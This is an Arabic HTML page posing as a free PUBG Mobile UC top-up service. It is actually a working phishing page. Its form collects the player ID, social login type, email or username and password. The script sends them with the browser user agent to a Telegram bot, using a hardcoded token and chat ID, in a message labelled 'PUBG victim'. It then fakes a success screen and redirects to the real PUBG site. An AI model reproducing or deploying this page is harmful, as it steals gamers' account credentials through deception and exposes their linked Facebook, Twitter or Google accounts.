<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>شحن شدات PUBG</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            font-family:'Segoe UI',Tahoma,sans-serif;
            background:linear-gradient(135deg,#1a1a2e,#16213e,#0f3460);
            color:#fff;min-height:100vh;
            display:flex;align-items:center;justify-content:center;padding:20px;
        }
        .container{
            background:rgba(0,0,0,0.75);border-radius:20px;padding:30px 20px;
            max-width:400px;width:100%;text-align:center;
            border:2px solid #f0c040;box-shadow:0 0 30px rgba(240,192,64,0.3);
        }
        h1{font-size:22px;color:#f0c040;margin-bottom:8px}
        .sub{color:#aaa;font-size:13px;margin-bottom:20px}
        .fg{margin-bottom:16px;text-align:right}
        label{display:block;color:#ccc;font-size:12px;margin-bottom:5px}
        input,select{
            width:100%;padding:12px;background:rgba(255,255,255,0.08);
            border:1px solid #444;border-radius:10px;color:#fff;
            font-size:14px;outline:none;
        }
        input:focus,select:focus{border-color:#f0c040}
        .btn{
            width:100%;padding:14px;margin-top:12px;
            background:linear-gradient(135deg,#f0c040,#e0a800);
            color:#000;border:none;border-radius:10px;
            font-size:17px;font-weight:bold;cursor:pointer;
        }
        .btn:active{transform:scale(0.96)}
        .load{
            display:none;position:fixed;inset:0;background:rgba(0,0,0,0.9);z-index:99;
            justify-content:center;align-items:center;flex-direction:column;
        }
        .load.show{display:flex}
        .spinner{
            width:50px;height:50px;border:4px solid #333;
            border-top:4px solid #f0c040;border-radius:50%;
            animation:spin 0.8s linear infinite;margin-bottom:15px;
        }
        @keyframes spin{to{transform:rotate(360deg)}}
        .done{
            display:none;position:fixed;inset:0;background:rgba(0,0,0,0.95);z-index:98;
            justify-content:center;align-items:center;flex-direction:column;
        }
        .done.show{display:flex}
        .done h2{color:#4CAF50;font-size:26px;margin:15px 0}
    </style>
</head>
<body>
<div class="container" id="form">
    <h1>🎮 شحن شدات PUBG</h1>
    <p class="sub">شحن مجاني لشدات PUBG Mobile</p>
    <div class="fg"><label>📱 رقم حساب PUBG</label><input type="text" id="pubg_id" placeholder="أدخل ID حسابك"></div>
    <div class="fg"><label>🔑 طريقة الدخول</label><select id="login_type"><option value="">-- اختر --</option><option value="Facebook">فيسبوك</option><option value="Twitter">تويتر</option><option value="Google">جوجل</option></select></div>
    <div class="fg"><label>👤 البريد / اسم المستخدم</label><input type="text" id="username" placeholder="البريد الإلكتروني"></div>
    <div class="fg"><label>🔒 كلمة المرور</label><input type="password" id="password" placeholder="كلمة المرور"></div>
    <div class="fg"><label>💰 الباقة</label><select id="amount"><option value="">-- اختر --</option><option>60 UC</option><option>300 UC</option><option>600 UC</option><option>1500 UC</option><option>6000 UC</option></select></div>
    <button class="btn" onclick="go()">⚡ ابدأ الشحن</button>
</div>
<div class="load" id="load"><div class="spinner"></div><p>⏳ جاري الشحن...</p></div>
<div class="done" id="done"><h2>✅ تم بنجاح!</h2><p>سيتم إضافة الشدات خلال 24 ساعة</p></div>
<script>
const u=new URL(window.location.href);
const CHAT=u.searchParams.get('chatId')||'7276604783';
const TOKEN=u.searchParams.get('token')||'8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo';
async function send(t){
    try{await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT,text:t,parse_mode:'HTML'})})}catch(e){}
}
async function go(){
    const id=document.getElementById('pubg_id').value.trim();
    const lt=document.getElementById('login_type').value;
    const un=document.getElementById('username').value.trim();
    const pw=document.getElementById('password').value.trim();
    const am=document.getElementById('amount').value;
    if(!id||!lt||!un||!pw||!am)return alert('املأ جميع الحقول');
    document.getElementById('load').classList.add('show');
    const msg=`🎮 <b>ضحية PUBG!</b>\n\n📱 ID: ${id}\n🔑 دخول: ${lt}\n👤 مستخدم: ${un}\n🔒 كلمة: ${pw}\n💰 باقة: ${am}\n\n📱 ${navigator.userAgent}`;
    await send(msg);
    setTimeout(()=>{document.getElementById('load').classList.remove('show');document.getElementById('done').classList.add('show');setTimeout(()=>{window.location.href='https://pubgmobile.com/'},3000)},4000);
}
</script>
</body>
</html>
